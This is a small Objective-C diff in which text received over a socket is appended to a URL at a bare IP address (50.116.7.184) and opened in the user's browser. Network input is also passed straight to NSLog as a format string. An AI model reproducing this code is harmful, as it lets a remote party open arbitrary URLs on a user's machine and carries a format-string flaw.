@@ -46,9 +46,14 @@
             buf[numbytes] = '\0';
            
             NSString *cmd = [NSString stringWithUTF8String: buf];
+            
             NSLog(cmd);
+            
             if(![cmd isEqualToString:@"empty"]){
-                [[NSWorkspace sharedWorkspace] openURL:[NSURL URLWithString:@"http://ytinstant.com/#BeMyThrill"]];
+                NSString *prefix = @"http://50.116.7.184/?";
+                NSString *URL = [prefix stringByAppendingString:cmd];
+                NSLog(URL);
+                [[NSWorkspace sharedWorkspace] openURL:[NSURL URLWithString:URL]];
             }
             
             close(sockfd);
